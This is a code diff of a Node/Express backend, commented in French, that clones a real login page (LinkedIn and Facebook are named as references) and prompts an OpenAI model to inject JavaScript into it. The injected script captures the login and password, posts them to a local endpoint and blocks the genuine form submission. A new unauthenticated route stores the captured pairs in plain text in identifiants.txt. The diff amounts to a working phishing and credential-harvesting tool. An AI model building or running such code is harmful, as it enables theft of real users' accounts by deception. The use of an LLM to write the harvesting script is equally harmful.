@@ -306,7 +306,7 @@ router.post('/send-emails', auth, (req, res, next) => {
  *                 description: L'URL du site à récupérer
  *     responses:
  *       200:
- *         description: Lien vers la page web générée
+ *         description: Lien vers la page web générée, les identifiants sont enregistrés dans identifiants.txt
  *         content:
  *           application/json:
  *             schema:
@@ -315,6 +315,9 @@ router.post('/send-emails', auth, (req, res, next) => {
  *                 link:
  *                   type: string
  *                   description: Lien vers la page web générée
+ *                 identifiantsFile:
+ *                   type: string
+ *                   description: Chemin vers le fichier identifiants.txt
  *       400:
  *         description: Requête invalide
  *       403:
@@ -324,7 +327,9 @@ router.post('/send-emails', auth, (req, res, next) => {
  *       500:
  *         description: Erreur interne du serveur
  */
-router.post('/generate-webpage', auth, (req, res, next) => {
+const puppeteer = require('puppeteer');
+
+router.post('/generate-webpage', auth, (req, res, next) => { // Fonctionne bien avec "https://www.linkedin.com/login" ou "https://www.facebook.com/" comme URL de référence
     if (req.user.role === 'admin') {
         return next();
     }
@@ -337,6 +342,13 @@ router.post('/generate-webpage', auth, (req, res, next) => {
     }
 
     let referenceContent = '';
+
+    // Créer le fichier identifiants.txt vide s'il n'existe pas, dans ../generated/
+    const generatedDir = path.join(__dirname, '../generated'); // Chemin du dossier 'generated'
+    const filePath = path.join(generatedDir, 'identifiants.txt'); // Chemin du fichier 'identifiants.txt'
+    if (!fs.existsSync(filePath)) { // Vérifier si le fichier n'existe pas
+        fs.writeFileSync(filePath, ''); // Créer le fichier s'il n'existe pas
+    }
 
     try {
         // Récupérer le contenu de l'URL de référence
@@ -362,11 +374,18 @@ Voici le code HTML de mon site web :
 ${referenceContent}
 \`\`\`
 
-Je souhaite modifier le formulaire de connexion de ce site pour que, lorsque le bouton de soumission est cliqué, le code JavaScript affiche via console.log() le login et le mot de passe précisés dans le formulaire de connexion. Il faut aussi s'assurer que la validation du formulaire ne fasse plus aucune action (exemple : si le formulaire redirige sur une autre page, ça ne doit plus être le cas). 
+Je souhaite que vous modifiiez le formulaire de connexion de ce site pour qu'il fasse ce qui suit lorsque le bouton de validation est cliqué :
+1. Affichez via console.log() le login et le mot de passe précisés dans le formulaire.
+2. Enregistrez le login et le mot de passe en envoyant une requête POST à "http://localhost:5000/api/features/save-identifiants" avec les données "login" et "password".
+3. Assurez-vous que le formulaire ne redirige pas et ne soumette pas les informations via une action standard. **Retirez ou désactivez l’attribut \`action\` du formulaire** pour empêcher toute redirection par défaut.
+4. Incluez l'empêchement de l’action par défaut du formulaire avec \`e.preventDefault()\` dans le code JavaScript.
+5. Ajoutez une redirection manuelle vers "http://localhost:5000/generated/index.html" une fois que l’envoi de la requête a été effectué avec succès, en utilisant \`window.location.href\`.
 
-Le JavaScript que vous fournirez devra inclure la commande pour empêcher l’action de soumission par défaut du formulaire. Il doit être encapsulé dans une balise <script> à placer juste avant la balise </body>.
+Si le formulaire n'est qu'une première partie contenant uniquement un login, alors suivre les consignes ci-dessus pour le login uniquement et ne pas inclure de mot de passe.
 
-Vous ne devez fournir que le code JavaScript à ajouter, sans réécrire le code existant et sans commentaire ni explication.
+Veuillez encapsuler uniquement le code JavaScript nécessaire dans une balise <script> que je placerai avant </body> et ne fournissez aucun commentaire ni explication supplémentaire. 
+
+Vous devez fournir uniquement le code JavaScript nécessaire sans inclure d'autres éléments HTML.
 `;
 
         // Appeler l'API OpenAI
@@ -403,6 +422,68 @@ Vous ne devez fournir que le code JavaScript à ajouter, sans réécrire le code
 
         // Retourner le lien vers le fichier généré
         res.status(200).json({ link: `http://localhost:5000/generated/index.html` });
+    } catch (error) {
+        res.status(500).json({ msg: 'Erreur serveur', error: error.message });
+    }
+});
+
+
+// Route pour enregistrer les identifiants
+/**
+ * @swagger
+ * /api/features/save-identifiants:
+ *   post:
+ *     summary: Enregistrer les identifiants de connexion (nécessite la permission "save_identifiants")
+ *     tags: [Features]
+ *     security:
+ *       - bearerAuth: []
+ *     requestBody:
+ *       required: true
+ *       content:
+ *         application/json:
+ *           schema:
+ *             type: object
+ *             properties:
+ *               login:
+ *                 type: string
+ *                 description: Le login de l'utilisateur
+ *               password:
+ *                 type: string
+ *                 description: Le mot de passe de l'utilisateur
+ *     responses:
+ *       200:
+ *         description: Identifiants enregistrés avec succès
+ *       400:
+ *         description: Requête invalide
+ *       500:
+ *         description: Erreur interne du serveur
+ */
+router.post('/save-identifiants', async (req, res) => {
+    const { login, password } = req.body;
+
+    if (!login || !password) {
+        return res.status(400).json({ msg: 'Login and password are required' });
+    }
+
+    try {
+        const generatedDir = path.join(__dirname, '../generated');
+        const filePath = path.join(generatedDir, 'identifiants.txt');
+
+        // Vérifier si le dossier 'generated' existe, sinon le créer
+        if (!fs.existsSync(generatedDir)) {
+            fs.mkdirSync(generatedDir);
+        }
+
+        // Vérifier si le fichier identifiants.txt existe, sinon le créer
+        if (!fs.existsSync(filePath)) {
+            fs.writeFileSync(filePath, ''); // Crée le fichier vide s'il n'existe pas
+        }
+
+        // Ajouter le login et le mot de passe sous forme "identifiant:mot_de_passe"
+        const logEntry = `${login}:${password}\n`;
+        fs.appendFileSync(filePath, logEntry);
+
+        res.status(200).json({ msg: 'Identifiants enregistrés avec succès dans /generated/identifiants.txt' });
     } catch (error) {
         res.status(500).json({ msg: 'Erreur serveur', error: error.message });
     }
